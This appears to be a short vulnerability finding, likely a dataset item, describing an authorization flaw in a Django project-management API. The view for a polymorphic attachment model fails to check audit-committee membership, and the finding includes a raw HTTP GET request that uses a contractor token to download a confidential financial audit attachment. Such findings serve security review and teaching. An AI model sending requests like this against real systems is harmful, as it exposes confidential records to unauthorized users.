diagnosis: TaskAttachment uses django-polymorphic to model varied project artifacts. The view checks general project membership, but when the instance is downcast to FinancialAuditAttachment, it fails to check if the user is part of the internal audit committee. Junior developers or external contractors on the project can download confidential executive audit attachments.
exploit_request:
GET /api/projects/tasks/attachments/ATT-FIN-20349/download/ HTTP/1.1
Host: projects.corpmanagement.com
Authorization: Bearer <contractor_token>
Accept: application/json
